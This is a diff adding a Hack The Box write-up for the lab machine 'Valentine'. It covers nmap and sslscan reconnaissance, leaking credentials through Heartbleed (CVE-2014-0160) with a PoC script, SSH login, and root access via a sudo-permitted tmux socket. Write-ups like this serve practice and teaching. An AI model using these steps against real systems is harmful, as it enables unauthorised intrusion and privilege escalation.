@@ -1,0 +1,134 @@
+# 💘 Hack The Box - Valentine
+
+**Machine Info**  
+- OS: Linux  
+- Difficulty: Easy  
+- IP: `10.10.10.79`  
+- Release Date: Legacy Box  
+- Author: HTB  
+- Write-up by: *Your Name*
+
+---
+
+## 🕵️‍♂️ Reconnaissance
+
+### 🔍 Nmap Scan
+
+```bash
+nmap -sC -sV -oA valentine 10.10.10.79
+
+
+
+Result:
+
+Port	Service	Version
+22	SSH	OpenSSH 6.6.1p1
+80	HTTP	Apache httpd 2.4.7
+443	HTTPS	Apache httpd (SSL)
+
+
+
+🌐 Web Enumeration
+🔎 Port 80 (HTTP)
+Default Apache page.
+
+Nothing useful via browser.
+
+Ran Nikto:
+
+nikto -h http://10.10.10.79
+No critical vulnerabilities found.
+
+
+
+🔒 Port 443 (HTTPS)
+SSL certificate is self-signed.
+
+Used sslscan:
+sslscan 10.10.10.79
+💥 Heartbleed Vulnerability Detected!
+
+
+
+
+!
+
+💉 Exploitation: Heartbleed (CVE-2014-0160)
+Used Heartbleed PoC to dump memory:
+python heartbleed.py 10.10.10.79
+🎯 Found leaked credentials:
+
+username: hype
+password: <shdshdsdshhyjsdsjjd>
+
+
+
+ssh hype@10.10.10.79
+Or using key (if given):
+
+ssh -i hype_key hype@10.10.10.79
+⚠️ Error:
+
+sign_and_send_pubkey: no mutual signature supported
+✅ Fix:
+sudo ssh-keygen -p -f hype_key -m pem
+Now login successful as hype.
+
+
+
+
+🧠 Post Exploitation
+🔍 Enumeration as hype
+Found something interesting in processes:
+
+
+ps aux | grep tmux
+
+/usr/bin/tmux -S /.devs/dev_sess
+Checked sudo -l:
+
+
+sudo -l
+Got permission to run tmux:
+User hype may run the following on valentine:
+    (ALL : ALL) NOPASSWD: /usr/bin/tmux
+🚀 Privilege Escalation
+Used the tmux socket:
+
+
+sudo /usr/bin/tmux -S /.devs/dev_sess
+
+
+
+
+
+🎯 Flags
+
+cat /home/hype/user.txt
+cat /root/root.txt
+🧰 Tools Used
+Nmap
+
+Nikto
+
+Heartbleed PoC (Python)
+
+SSLScan
+
+Tmux
+
+SSH / SSH-Keygen
+
+
+
+
+
+
+🧠 Takeaways
+Heartbleed is a real and dangerous bug that can leak memory.
+
+Proper SSH key format is important (PEM vs newer formats).
+
+Misconfigured tmux can lead to privilege escalation if socket is accessible.
+
+
